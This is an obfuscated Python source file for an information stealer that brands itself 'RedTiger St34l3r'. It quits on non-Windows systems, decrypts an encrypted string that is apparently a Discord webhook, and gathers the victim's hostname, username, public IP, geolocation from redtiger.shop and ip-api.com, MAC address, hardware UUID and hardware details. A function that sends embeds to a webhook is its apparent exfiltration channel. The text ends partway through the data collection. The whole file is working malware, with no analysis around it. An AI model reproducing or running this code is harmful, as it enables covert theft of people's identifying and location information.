
import sys

def LPDDYDOOWVTIHVYIKLXPUZUUKCHMJSMBJPEIQYZLIVBLRPFWPXNEIGXSOGTVBPSLRSWPOTOHTVSN():
    def DKGDRNXRINFNYLONTEMQVEZVSGNRZBXBEPPITIBNCLRHWMIOWILWDRIHWWAMJOPCIFXERKBZUYMNXYCY():
        if sys.platform.startswith("win"):
            return False
        else:
            return True
    
    try: 
        HTCVXRMVNXUVJJZPWLMUTRDYJEVFJYXWTWVTGZFACDMUEBGJGCJSHPVHIRBV = DKGDRNXRINFNYLONTEMQVEZVSGNRZBXBEPPITIBNCLRHWMIOWILWDRIHWWAMJOPCIFXERKBZUYMNXYCY()
        if HTCVXRMVNXUVJJZPWLMUTRDYJEVFJYXWTWVTGZFACDMUEBGJGCJSHPVHIRBV == True:
            return HTCVXRMVNXUVJJZPWLMUTRDYJEVFJYXWTWVTGZFACDMUEBGJGCJSHPVHIRBV
    except:
        return True
    
if LPDDYDOOWVTIHVYIKLXPUZUUKCHMJSMBJPEIQYZLIVBLRPFWPXNEIGXSOGTVBPSLRSWPOTOHTVSN() == True:
    sys.exit()
    
import os
import socket
import win32api
import requests
import base64
import ctypes
import threading
import discord
from discord import SyncWebhook
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

def DSWVXJRBOGXZGTNXDUUNEOUAOOMKXMVNHSBSWFGPEVOMRQXOBLZTQNBJXWLJNSWGQPKYP(): pass
def MXMTDMZRQQWKIKKZHJGQNXPXABWJISQVQNQMWFOXVVBRGDMEVNWNJYMYJLX(): pass
def EUREHKLOIYVKWOJBQMYDUYRPQNQKDRNQICNCRQKZZZAUGAAIMNINHTPNZWMMBDTATXTBPGLICOUPQAMPPNVGLE(): pass
def JURMZNJIOKCIDBOIPADRGKAUJXNNBGAEXUTUJEJFKWGJYDWJOIGCOSHRXNGLBUV(): pass
def ZKADPOAXSOXSAZFHYYBRTJJRBSWXSMZNFKFSHYXRYLQSKULGOOKZHUJBUXUQGJNSOMWCWSDIOG(): pass
def YGHRXEYYYWFRZXXAABVUWXLNJCUHXPNUDLYITARDWNTGEWXFERJAAJAPYEGHYKXULQRREJNORBWRXIYTLKGPWZEKV(): pass
def LVDRWMZMEIXKYSSVAGPRQQZKWAGGUGPJNGXQTORRCXAQXKDAKWLRMVQERGTSYRVKRIWBSGPSLIOQLLHDUDPCWPRSTTTT(): pass
def FAECYFNNQXDDNWHGRAJGLKGIUFHLEUUZNFHLGKCKVOGXCUWJEHUSLNRBOPEDGPMNIKQDVVTLW(): pass
def GOVXOLYTVZTEITFOYAXDPJZSWAAUVYYEPDUZWVXZAIVSZZZWKKGLIHTHKHDCYLLNMZCNKHNWSJTJPYDAVFBEEZTR(): pass
def BFMLKABPJZDBIAAFITQXFHRBTDIKJUSKPTMACGWMOZLYPNBAXPRSDSGXBSVDUFLDBZLFDGBPLVCPNRKKUFALJPNHOLHVCXWNOV(): pass
def JIXMPPDJEZOZSNFGTQAHQFXHKEOXHFOURXLNBQXZZNAHCAPAMUBFGOBIPYUAEOPKQEPXHXVYWHMCRJUASNSH(): pass
def UDCUDCXKRSUFLSYROPWADGBHSXKQDVJCLHRXFSRTVYPCEZYIXVKQDUFSFWFUHDKHB(): pass
def KCAEDQSOVCGKAGHVMMHMGZZXBMROYAWACJSXTZIVWCAQYEYVIQHVXUSNDNEPYHKJRFYUKGMDQQUVDV(): pass
def DZKTFMTFNMJNKOPZPQGYXACWXWLNLGQZJKAHXGCAEBRNIXLRNNLAVMUOFWHQCVMPTDNMZVUCGANFUMHNUI(): pass
def TCWPKYKZEPZRRXHYPYPYXGBAJERRLONIYISPWJKBBCFISBPHVCQQMOJMGSRJHRGKOGBCBKPYRPJJBDM(): pass
def GDEZAJWHRTRPXQEKPSUAPLSOYAIWGTAVJVGDUNQYURHZYRGZSLQNGHHYNGRLCBIUPGCXISLGVTIVKUAVDGDXXCMAJOVHKD(): pass
def BYEIKAFYQZXJOBJZZBGWSCTAQYQTTGJOBMPFWMOINJGRGFIZJPGSIXOPLQIIVSIF(): pass
def PKELAIJHFMXWGNETIMWEMSRQUDJEZDEKNUYBVQHPIWHDWURBQPTHYNJZMHLKRMIXFGILELCDLWHO(): pass
def HHMKFOOVKAXNCGRSSECUOIDOWKBNIXRLGOEKEZIDYISRNVILWDPRSQOYEYTHYPYXKAXAHILWZMAPMXGKVAOSKHQRURSGJMPFAADY(): pass
def XMPNDTMNDILZOOSTSJLIKKHEZVXWJHHIIXXDJZBFTWTFLTQYBMYU(): pass

def NSOGKUFJECAHAHGZSSJSSQWJIKNVJHYQGCLUHVTPZWQBGZGOMPOKNROLOZNHXIWC(w3bh00k_ur1, title=None, description=None):
    try:
        client = SyncWebhook.from_url(w3bh00k_ur1)
        embed = discord.Embed(
            title=title,
            description=description,
            color= DNELUTIPWJOZTULOMFHJWJJZAFVXALFGOVGTTHOTYCMNDYPADROGVNVBFJXRN
        )
        embed.set_footer(text=VESUBNJMUJUISETCMMULDLVANAOHCUJNNPPZZGWNXHHOWJTLXDHVREXNPRYKFTLEOQRIDGRTNFKWSHEYECXVDJMQ, icon_url=CXSOUFNGUAAONNKBBBLJRFERXZPMOFCYLKEMUHOPOGMLRNLRIPXXCQYJOXGIFSDYVEGZHPXSUNOXI)
        client.send(embed=embed, username=LMRAEHHWDRLRJFXVQBVICRAQPOCOVBBOLNBRUAOGUGDKOMAHPTNYFEGZRVQDWHXOVMUFXGZRSUEBDCIH, avatar_url=CXSOUFNGUAAONNKBBBLJRFERXZPMOFCYLKEMUHOPOGMLRNLRIPXXCQYJOXGIFSDYVEGZHPXSUNOXI)
    except: pass

def PYSICYEWWUVSUJFMCKVONYMAAIHOXLDPOSMYYVTXOMOOWNPHRKVNXRCUWUAWGCCBSYEKXIXKEKRDCKQYCBKIDBSH(title):
    try:
        if sys.platform.startswith("win"):
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        elif sys.platform.startswith("linux"):
            sys.stdout.write(f"\x1b]2;{title}\x07")
    except:
        pass
        
def ZEFKEPHCWNGPRDHOOWOELDAGUPJKLPIQPOJPNPNXFHKGMVAPPGXRTZHIUIRPVSMKQASQULINKBDGSF():
    try:
        if sys.platform.startswith("win"):
            os.system("cls")
        elif sys.platform.startswith("linux"):
            os.system("clear")
    except:
        pass

def UCAQXCUKNZITJPNDAVPSNLJZVQZQNICPJKLXONRQTBNYLMZSEACESTGVRLJLLAARKYTDOARQRFCNQKVDMMWDQBTPRANNWJKTBWHQ(TTYXNSTTGNZSZQLUQGPGNPVHJQETSWQLMBOUXHZTMLBAGAUBSPZOUKKMSGIGASZIUIPC, LEEIVETUQNXCCLUHIWFXJINBSBDLFJTCNBTCLGHXWKYXWRZLYAEELVCXVVLCFDWQTIPUYDNVHHUYMPWRYWFIBJ):
    def HVHXBCXXCGSJVYGLBGJNVDQLXKIDDVCYPGXWGVBVYDYTMKMMRYASZMKUBURXFKFEERQ(NEMRFSDMGVOQZDGBMOPJXHQQLWPHKYZGHERINATTTYWOQIVZKVQECNJHKKNQOQXANYOZMMMGBWEZ, WWQBNFZXROYARJMHQOHPETPFSSLFYLFICSERFJPISOMZRGNHRZBSBTGSQPIOEIJAGULAH):
        GPQBUEATWOOVMYGIPGHUWGRVPBYQHSVYHWMNJUBUTOOTDAUDMJFSRRPTFNLTGLUQUBKGUCYQCAJBQMRTVYHTPBZJISRHZ = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=WWQBNFZXROYARJMHQOHPETPFSSLFYLFICSERFJPISOMZRGNHRZBSBTGSQPIOEIJAGULAH, iterations=100000, backend=default_backend())
        if isinstance(NEMRFSDMGVOQZDGBMOPJXHQQLWPHKYZGHERINATTTYWOQIVZKVQECNJHKKNQOQXANYOZMMMGBWEZ, str):  
            NEMRFSDMGVOQZDGBMOPJXHQQLWPHKYZGHERINATTTYWOQIVZKVQECNJHKKNQOQXANYOZMMMGBWEZ = NEMRFSDMGVOQZDGBMOPJXHQQLWPHKYZGHERINATTTYWOQIVZKVQECNJHKKNQOQXANYOZMMMGBWEZ.encode()  
        return GPQBUEATWOOVMYGIPGHUWGRVPBYQHSVYHWMNJUBUTOOTDAUDMJFSRRPTFNLTGLUQUBKGUCYQCAJBQMRTVYHTPBZJISRHZ.derive(NEMRFSDMGVOQZDGBMOPJXHQQLWPHKYZGHERINATTTYWOQIVZKVQECNJHKKNQOQXANYOZMMMGBWEZ)

    TTYXNSTTGNZSZQLUQGPGNPVHJQETSWQLMBOUXHZTMLBAGAUBSPZOUKKMSGIGASZIUIPC_data = base64.b64decode(TTYXNSTTGNZSZQLUQGPGNPVHJQETSWQLMBOUXHZTMLBAGAUBSPZOUKKMSGIGASZIUIPC)
    WWQBNFZXROYARJMHQOHPETPFSSLFYLFICSERFJPISOMZRGNHRZBSBTGSQPIOEIJAGULAH = TTYXNSTTGNZSZQLUQGPGNPVHJQETSWQLMBOUXHZTMLBAGAUBSPZOUKKMSGIGASZIUIPC_data[:16]
    ULCMLKXALDGBNXBYCKLALSZQMALYHUVFPTCBMGPYLGNGULWQDLORSDHQFONGUXHTWWPLUKHGSVVLXOUKY = TTYXNSTTGNZSZQLUQGPGNPVHJQETSWQLMBOUXHZTMLBAGAUBSPZOUKKMSGIGASZIUIPC_data[16:32]
    TTYXNSTTGNZSZQLUQGPGNPVHJQETSWQLMBOUXHZTMLBAGAUBSPZOUKKMSGIGASZIUIPC_data = TTYXNSTTGNZSZQLUQGPGNPVHJQETSWQLMBOUXHZTMLBAGAUBSPZOUKKMSGIGASZIUIPC_data[32:]
    GIMFILWWKXEEHQDLCWLELUCQJCPLRWDHNBGBJZXOSXPHBEMGEMUZKXFJIUQANYFGP = HVHXBCXXCGSJVYGLBGJNVDQLXKIDDVCYPGXWGVBVYDYTMKMMRYASZMKUBURXFKFEERQ(LEEIVETUQNXCCLUHIWFXJINBSBDLFJTCNBTCLGHXWKYXWRZLYAEELVCXVVLCFDWQTIPUYDNVHHUYMPWRYWFIBJ, WWQBNFZXROYARJMHQOHPETPFSSLFYLFICSERFJPISOMZRGNHRZBSBTGSQPIOEIJAGULAH)
    EJCKAWSSHKJZJMWIPDIXJHYUKIJBFWCDDCSBCXLJNNTQAVFGSOUBHNFQRTPULOLEFUBKXOKWTEATCAWYXDDCMJKOZSME = Cipher(algorithms.AES(GIMFILWWKXEEHQDLCWLELUCQJCPLRWDHNBGBJZXOSXPHBEMGEMUZKXFJIUQANYFGP), modes.CBC(ULCMLKXALDGBNXBYCKLALSZQMALYHUVFPTCBMGPYLGNGULWQDLORSDHQFONGUXHTWWPLUKHGSVVLXOUKY), backend=default_backend())
    ESGWYPCMXXZSSURLERFIGFNBHOZCIRXTXOQLHVHJPIGDUQEUBCVVKPZZBLDHAMBICUXAVOLOWRFYT = EJCKAWSSHKJZJMWIPDIXJHYUKIJBFWCDDCSBCXLJNNTQAVFGSOUBHNFQRTPULOLEFUBKXOKWTEATCAWYXDDCMJKOZSME.decryptor()
    UKHJNWAJUHRDJTHWENSRZQNKEWDDCAEWZCLNZNREVOUBOHNHRNRGPZ = ESGWYPCMXXZSSURLERFIGFNBHOZCIRXTXOQLHVHJPIGDUQEUBCVVKPZZBLDHAMBICUXAVOLOWRFYT.update(TTYXNSTTGNZSZQLUQGPGNPVHJQETSWQLMBOUXHZTMLBAGAUBSPZOUKKMSGIGASZIUIPC_data) + ESGWYPCMXXZSSURLERFIGFNBHOZCIRXTXOQLHVHJPIGDUQEUBCVVKPZZBLDHAMBICUXAVOLOWRFYT.finalize()
    NJAQDAWDKJQIMDMKNRRXQQTZDKZVMTRPGOVWOTYPNPLJYNBNZUXSRHWFUIIZUPIIJYXHWYBIRNVN = padding.PKCS7(128).unpadder()
    FRRTDEPECNDBIHKTGGWFQRUGUKYCYCZFKLCZCOLYCYDGULJRUUSGJ = NJAQDAWDKJQIMDMKNRRXQQTZDKZVMTRPGOVWOTYPNPLJYNBNZUXSRHWFUIIZUPIIJYXHWYBIRNVN.update(UKHJNWAJUHRDJTHWENSRZQNKEWDDCAEWZCLNZNREVOUBOHNHRNRGPZ) + NJAQDAWDKJQIMDMKNRRXQQTZDKZVMTRPGOVWOTYPNPLJYNBNZUXSRHWFUIIZUPIIJYXHWYBIRNVN.finalize()
    return FRRTDEPECNDBIHKTGGWFQRUGUKYCYCZFKLCZCOLYCYDGULJRUUSGJ.decode()

PYSICYEWWUVSUJFMCKVONYMAAIHOXLDPOSMYYVTXOMOOWNPHRKVNXRCUWUAWGCCBSYEKXIXKEKRDCKQYCBKIDBSH("")

try: PXKDJVIGTTFJBTZVHSWUUYITWHWUSFFLBFCJRBRBWWSYYAHAFYXSJRDEJWO    = socket.gethostname()
except: PXKDJVIGTTFJBTZVHSWUUYITWHWUSFFLBFCJRBRBWWSYYAHAFYXSJRDEJWO = "None"

try: HZZPWNZVJHVZVNEQTTEAHPFNCGCFORNVVJAZNZKMHHPLZTJHRQETJTMGUBEUGPPVKJNNCQVAFJLSEQACKNSLOLGCVHX    = os.getlogin()
except: HZZPWNZVJHVZVNEQTTEAHPFNCGCFORNVVJAZNZKMHHPLZTJHRQETJTMGUBEUGPPVKJNNCQVAFJLSEQACKNSLOLGCVHX = "None"

try: DLWMHZAGBZSXRVXEAEMZVJQMCVXIOEAMGVYUQKCGONSSBIXNMTTPBPWDBSMEWNGTTOVCVU    = win32api.GetUserNameEx(win32api.NameDisplay)
except: DLWMHZAGBZSXRVXEAEMZVJQMCVXIOEAMGVYUQKCGONSSBIXNMTTPBPWDBSMEWNGTTOVCVU = "None"

try: YKQCOOZPWSWEUWYGMNCVFYKYFCBHHNFUIYMZJDPHBSAACEUZZSTXZBXEPJDRQSECHZYJFC    = requests.get("https://api.ipify.org?format=json").json().get("ip", "None")
except: YKQCOOZPWSWEUWYGMNCVFYKYFCBHHNFUIYMZJDPHBSAACEUZZSTXZBXEPJDRQSECHZYJFC = "None"

try: MGFYHQGMKUAOUOTSYXJQQPVBTIYEGIKEOQFLASRWHUKRVGBOKQYTEVLSJWPWVSYKH    = socket.gethostbyname(socket.gethostname())
except: MGFYHQGMKUAOUOTSYXJQQPVBTIYEGIKEOQFLASRWHUKRVGBOKQYTEVLSJWPWVSYKH = "None"

ZWCWZXUTZBRCSDAKXHXCWRXLKFUCRQJUZWHRMEWQKTWRFUNCNVGKUXRKMVS = r"""
gG+Y2939t3hnww1novlxJqHUcBbt4JsO010viVCR73TWyl9c/1vGnKaZinO7nkDlp2RoVQXIcqk6UYlQ5gxmKjNQdXmiPKyy3RAXJtWLxuR0iHzQu2sF/Zrq+oC8qdD2eNe8MAZw3XllnwvFkSqCjVz5hnzw1LCKGa//apj9xTRlHTgPl0NZybICHOH2TTiHtwSFxliKg3/x1Ju2fERoGw==
"""

FGJALDZMHHHOKKBPHSOPPAHGGDJSMZVQGYDPWVEKTBZZKKKQVMLDQNTJGHCPUFDKBPKUDUHXTZARMIMAP            = "EBuvvEmiMgQlcPJkiwlzmXOJMJGqIHodsedQCSFrjsStkspGeHMXTUaNEpDbZisSyzSRzBSpCefPvlDhiyHEkdWnOkvUxCoqFCIGByQkPjQSgoocfDUNfP"
YZMOKMGQUNVHCFDRUNXFENHMLFMLPOJCUENHLNQKSLPOMQAACRLFPXXNXONCHHZSGKZKQK        = "redtiger.shop"
DNELUTIPWJOZTULOMFHJWJJZAFVXALFGOVGTTHOTYCMNDYPADROGVNVBFJXRN    = 0xa80505
LMRAEHHWDRLRJFXVQBVICRAQPOCOVBBOLNBRUAOGUGDKOMAHPTNYFEGZRVQDWHXOVMUFXGZRSUEBDCIH = "RedTiger St34l3r"
CXSOUFNGUAAONNKBBBLJRFERXZPMOFCYLKEMUHOPOGMLRNLRIPXXCQYJOXGIFSDYVEGZHPXSUNOXI   = "https://cdn.discordapp.com/attachments/1337898355279401023/1341890893858213908/RedTiger-Logo.png?ex=67b7a4c8&is=67b65348&hm=174ddbd80dd8570fa83779687def6eda441a7c12abd3765d970c1958ceeb1ec8&"
VESUBNJMUJUISETCMMULDLVANAOHCUJNNPPZZGWNXHHOWJTLXDHVREXNPRYKFTLEOQRIDGRTNFKWSHEYECXVDJMQ    = "RedTiger St34l3r - github.com/loxy0dev/RedTiger-Tools"
BHFXUXTMACYRFPTIFGWHXUSQYSQGEQOXOUNXLQTUFSIJYYZSQYHL   = {"text": VESUBNJMUJUISETCMMULDLVANAOHCUJNNPPZZGWNXHHOWJTLXDHVREXNPRYKFTLEOQRIDGRTNFKWSHEYECXVDJMQ, "icon_url": CXSOUFNGUAAONNKBBBLJRFERXZPMOFCYLKEMUHOPOGMLRNLRIPXXCQYJOXGIFSDYVEGZHPXSUNOXI}
SSKHZDLRNGSSIMEUEDTUYTPURKATDZYJIBJGYNZNNMJLTOXPPOGSXUNCIJDJNVKUXFNUNEFTOOGEGIMFZRVSMYXMRBUQPQPROB    = f'`{HZZPWNZVJHVZVNEQTTEAHPFNCGCFORNVVJAZNZKMHHPLZTJHRQETJTMGUBEUGPPVKJNNCQVAFJLSEQACKNSLOLGCVHX} "{YKQCOOZPWSWEUWYGMNCVFYKYFCBHHNFUIYMZJDPHBSAACEUZZSTXZBXEPJDRQSECHZYJFC}"`'
MMYEKZMRKBSJGZQBUCBLHWMRTMRCPCRTXUGBXUXZYEJYSRERZMQKDCEHHEVWCBCVBIHTDQQVKHX    = UCAQXCUKNZITJPNDAVPSNLJZVQZQNICPJKLXONRQTBNYLMZSEACESTGVRLJLLAARKYTDOARQRFCNQKVDMMWDQBTPRANNWJKTBWHQ(ZWCWZXUTZBRCSDAKXHXCWRXLKFUCRQJUZWHRMEWQKTWRFUNCNVGKUXRKMVS, FGJALDZMHHHOKKBPHSOPPAHGGDJSMZVQGYDPWVEKTBZZKKKQVMLDQNTJGHCPUFDKBPKUDUHXTZARMIMAP)

LEMJAXLOWGFTGTGRFVXVSFRMQMZODSSAZXMCCXWDCEAEMMWANA         = os.getenv("WINDIR", None).replace(" ", "%20")
YBWLZVZPEIIQADQGYQDEXLDFYRYTOHDAMSXBGKOCMCKNBLNEPYBXCQR     = os.getenv('USERPROFILE', None).replace(" ", "%20")
DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA   = os.getenv('LOCALAPPDATA', None).replace(" ", "%20")
RBSDCZDAGTWTUDQFXILSLKUPJMRJSYHWKJFIKFCBPQEEFKHSVGJTTE = os.getenv('APPDATA', None).replace(" ", "%20")

try:
    MTCGLBQMMINTVCOKFRERPLKDOCWYEBYCXBACIZQOFSALMFBYTENBMTOMERMPYHU = requests.get(f"https://{YZMOKMGQUNVHCFDRUNXFENHMLFMLPOJCUENHLNQKSLPOMQAACRLFPXXNXONCHHZSGKZKQK}/api/ip/ip={YKQCOOZPWSWEUWYGMNCVFYKYFCBHHNFUIYMZJDPHBSAACEUZZSTXZBXEPJDRQSECHZYJFC}")
    HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ = MTCGLBQMMINTVCOKFRERPLKDOCWYEBYCXBACIZQOFSALMFBYTENBMTOMERMPYHU.json()

    KTDYLIMNIRIRRXCIEKGEYITKCDNQPAQLFLULSABKVJMGKAEYYTWQVZCSJAMJBBJGMNAAHWVWTWIEEWDWGBFWUIJPZK = HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('country', "None")
    KTDYLIMNIRIRRXCIEKGEYITKCDNQPAQLFLULSABKVJMGKAEYYTWQVZCSJAMJBBJGMNAAHWVWTWIEEWDWGBFWUIJPZK_code = HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('country_code', "None")
    CMDBFNQXZMDGFSHKFTUYJABDFFKGAPKLTYLQNCNWBXLLGKSTATXHYJAUJXB = HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('region', "None")
    CMDBFNQXZMDGFSHKFTUYJABDFFKGAPKLTYLQNCNWBXLLGKSTATXHYJAUJXB_code = HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('region_code', "None")
    RTCITEGTNWSVPCRBHGYPMWOUCLKGVJWJZYZYNXGCYZFXPVYRGNEBTCVCOVEAAULZRJAAWUJFUDDJF = HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('zip', "None")
    DHKGZYYOZTQHNDKPCIXPVBRETDZJKQONHXEKKTILJWEQTDFRHFZCUXOIV = HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('city', "None")
    ISXLUIHGTUEWERTMOILPOBGLIWBRGTWROKCXPSCKLHMIUYWBESMBJOUISEXFEUPXAUSLYUEQOKZUKVBBZSUKGOVYRRQGZCEVW = HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('latitude', "None")
    GAQEVKMSMAPZAVVMQTRMGQYBHCHPGFDTNOUHCBPTVOEGEOGZHEJAAEYLCVAJXVXQCHNJXTHVDIIDHJVYMKBDKMDTRUCLEYPTJ = HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('longitude', "None")
    VMAABVBEGMLOZHIWIFMPMXNEOXVQCGIHASWPQIPLORONPIBUUHGPXLJDCOQEUGDRMCBTMIDITVICNUWXTLLICQELBI = HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('timezone', "None")
    FSJNHKJYSVKHVQDEKSUAQQNAHESFRZAAIQMKLFZQXPJTFIYWXONBGP = HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('isp', "None")
    PAIRCBIBNQFOVIDTRAOQFZFRNNVYFIECIUIEBNZPZKIAAFNUZEWEEUCCIF = HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('org', "None")
    OIKVUEARRQQPEXGUTESRWTIMUMAVLSPQJSBDGTXUYZBIOLTBYYOIMYGZDXIAAEIGNEGDNAYR = HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('as', "None")
except:
    MTCGLBQMMINTVCOKFRERPLKDOCWYEBYCXBACIZQOFSALMFBYTENBMTOMERMPYHU = requests.get(f"http://ip-api.com/json/{YKQCOOZPWSWEUWYGMNCVFYKYFCBHHNFUIYMZJDPHBSAACEUZZSTXZBXEPJDRQSECHZYJFC}")
    HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ = MTCGLBQMMINTVCOKFRERPLKDOCWYEBYCXBACIZQOFSALMFBYTENBMTOMERMPYHU.json()

    KTDYLIMNIRIRRXCIEKGEYITKCDNQPAQLFLULSABKVJMGKAEYYTWQVZCSJAMJBBJGMNAAHWVWTWIEEWDWGBFWUIJPZK = HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('country', "None")
    KTDYLIMNIRIRRXCIEKGEYITKCDNQPAQLFLULSABKVJMGKAEYYTWQVZCSJAMJBBJGMNAAHWVWTWIEEWDWGBFWUIJPZK_code = HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('countryCode', "None")
    CMDBFNQXZMDGFSHKFTUYJABDFFKGAPKLTYLQNCNWBXLLGKSTATXHYJAUJXB = HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('regionName', "None")
    CMDBFNQXZMDGFSHKFTUYJABDFFKGAPKLTYLQNCNWBXLLGKSTATXHYJAUJXB_code = HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('region', "None")
    RTCITEGTNWSVPCRBHGYPMWOUCLKGVJWJZYZYNXGCYZFXPVYRGNEBTCVCOVEAAULZRJAAWUJFUDDJF = HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('zip', "None")
    DHKGZYYOZTQHNDKPCIXPVBRETDZJKQONHXEKKTILJWEQTDFRHFZCUXOIV = HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('city', "None")
    ISXLUIHGTUEWERTMOILPOBGLIWBRGTWROKCXPSCKLHMIUYWBESMBJOUISEXFEUPXAUSLYUEQOKZUKVBBZSUKGOVYRRQGZCEVW = HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('lat', "None")
    GAQEVKMSMAPZAVVMQTRMGQYBHCHPGFDTNOUHCBPTVOEGEOGZHEJAAEYLCVAJXVXQCHNJXTHVDIIDHJVYMKBDKMDTRUCLEYPTJ = HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('lon', "None")
    VMAABVBEGMLOZHIWIFMPMXNEOXVQCGIHASWPQIPLORONPIBUUHGPXLJDCOQEUGDRMCBTMIDITVICNUWXTLLICQELBI = HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('timezone', "None")
    FSJNHKJYSVKHVQDEKSUAQQNAHESFRZAAIQMKLFZQXPJTFIYWXONBGP = HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('isp', "None")
    PAIRCBIBNQFOVIDTRAOQFZFRNNVYFIECIUIEBNZPZKIAAFNUZEWEEUCCIF = HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('org', "None")
    OIKVUEARRQQPEXGUTESRWTIMUMAVLSPQJSBDGTXUYZBIOLTBYYOIMYGZDXIAAEIGNEGDNAYR = HBWSQIQIZIXGBIBMHLCNZZXBJGFAOZZGQEVESJSRHWXWXCCBJIDSJEXZGLOIVEIZ.get('as', "None")

def LVDRWMZMEIXKYSSVAGPRQQZKWAGGUGPJNGXQTORRCXAQXKDAKWLRMVQERGTSYRVKRIWBSGPSLIOQLLHDUDPCWPRSTTTT():
    import platform
    import subprocess
    import uuid
    import psutil
    import GPUtil
    import ctypes
    import win32api
    import string
    import screeninfo
    from discord import SyncWebhook, Embed

    try: CNXKJBYSSUFBKVEFREMVGZZWGBXPRGDTEJCSXHUDLKOYKPXUNPQOVKOSRFOQDZADRZUNFXICRLUOBXZUISBAHMJSHHNSMOEOBW = {platform.system()}
    except: CNXKJBYSSUFBKVEFREMVGZZWGBXPRGDTEJCSXHUDLKOYKPXUNPQOVKOSRFOQDZADRZUNFXICRLUOBXZUISBAHMJSHHNSMOEOBW = "None"

    try: ZQYPAUGFAVJQGCJFEPTEWKJPZUJRGJDMYVPHGHSYTPDFKYHYPTQWCOVZWQQKOUWWWWNGRVOKSKVKZRGCNAVZS = platform.version()
    except: ZQYPAUGFAVJQGCJFEPTEWKJPZUJRGJDMYVPHGHSYTPDFKYHYPTQWCOVZWQQKOUWWWWNGRVOKSKVKZRGCNAVZS = "None"

    try: IKVMHOFRMOGVSQFXYLQTGHQFQNKDJOQTSBBIGNPGOTVPSQFPOJRGXMBJYWSGNUOGVLINKY = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    except: IKVMHOFRMOGVSQFXYLQTGHQFQNKDJOQTSBBIGNPGOTVPSQFPOJRGXMBJYWSGNUOGVLINKY = "None"

    try: BYTDAHFKTVXLMEIJBUKBWDDFNINYXOGBPZHYVJAMIFSIMNWOUUBMJXYDXKBVCKVIJBOFLWRNQKSRSDLGJIFCQ = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
    except: BYTDAHFKTVXLMEIJBUKBWDDFNINYXOGBPZHYVJAMIFSIMNWOUUBMJXYDXKBVCKVIJBOFLWRNQKSRSDLGJIFCQ = "None"

    try: JRHQIBYPTPOQWZSPZZUTGLPDJLGQJCNSYSOJSZQCIZRHJFDMBTEVOYOFJKKFQLKCAOJDMCPPHPQPRRQNSJHUH = round(psutil.virtual_memory().total / (1024**3), 2)
    except: JRHQIBYPTPOQWZSPZZUTGLPDJLGQJCNSYSOJSZQCIZRHJFDMBTEVOYOFJKKFQLKCAOJDMCPPHPQPRRQNSJHUH = "None"

    try: QBADXLPMRMBSXNLBGVUXGXIVWSRFHSKTOMZJGYWTPKIDEQBQHHG = platform.processor()
    except: QBADXLPMRMBSXNLBGVUXGXIVWSRFHSKTOMZJGYWTPKIDEQBQHHG = "None"

